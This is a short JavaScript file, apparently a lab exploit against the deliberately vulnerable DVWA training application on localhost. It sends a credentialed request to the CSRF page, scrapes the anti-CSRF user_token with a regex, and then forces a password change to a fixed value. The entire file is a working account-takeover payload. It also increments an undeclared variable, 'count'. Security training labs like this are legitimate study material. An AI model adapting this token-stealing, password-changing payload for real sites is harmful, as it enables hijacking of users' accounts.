var theUrl = 'http://localhost:11110/DVMA/vulnerabilities/csrf/';
var pass = 'pippo';
if (window.XMLHttpRequest){
    xmlhttp=new XMLHttpRequest();
}else{
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.withCredentials = true;
var hacked = false;
xmlhttp.onreadystatechange=function(){
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        var token = match[1];
        var new_url = 'http://localhost:11110/DVMA/vulnerabilities/csrf/?password_new='+pass+'&password_conf='+pass+'&Change=Change'+'&user_token='+token;
        if(!hacked){
            alert('Got token:' + match[1]);
            hacked = true;
            xmlhttp.open("GET", new_url, false );
            xmlhttp.send();  
        }
        count++;
    }
};
xmlhttp.open("GET", theUrl, false );
xmlhttp.send();
